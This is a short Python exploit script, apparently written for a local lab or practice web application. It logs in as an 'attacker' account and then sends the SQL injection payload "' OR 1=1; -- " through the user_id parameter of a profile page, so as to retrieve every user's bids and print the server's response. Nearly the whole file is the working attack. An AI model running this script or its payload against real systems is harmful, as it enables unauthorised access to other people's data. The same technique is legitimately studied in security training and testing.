import requests
from bs4 import BeautifulSoup

LOGIN_URL = "http://localhost:8080/login.php"
USER_BIDS_URL = "http://localhost:8080/my_profile.php"  # URL to retrieve user bids

# Your login credentials
USERNAME = "attacker"
PASSWORD = "2222"

def login(session, username, password):
    """Log in to the site and return the session."""

    # This is the form data that the page sends when logging in
    login_data = {
        "user_name": username,
        "password": password
    }

    # Send a POST request to the LOGIN_URL with the form data
    response = session.post(LOGIN_URL, data=login_data)

    # Check for successful login
    if response.status_code != 200:
        raise Exception(f"Failed to log in: {response.text}")

def exploit(session):
    """Perform SQL Injection to retrieve all user bids."""

    # Prepare SQL Injection payload
    sql_injection = "' OR 1=1; -- "

    # Send a GET request to retrieve user bids with SQL injection
    response = session.get(
        USER_BIDS_URL,  # URL to retrieve user bids
        params={
            'user_id': sql_injection,
            'offset': 0,
            'limit': 50
        }
    )

    # Print the entire HTML response
    print(f"HTTP Status Code: {response.status_code}")
    print(f"Server Response: \n{response.text}")

def main():
    # Start a session so we can have persistent cookies
    session = requests.session()

    # Login as the attacker user
    login(session, USERNAME, PASSWORD)

    # Perform the SQL injection to retrieve all user bids
    exploit(session)

if __name__ == "__main__":
    main()
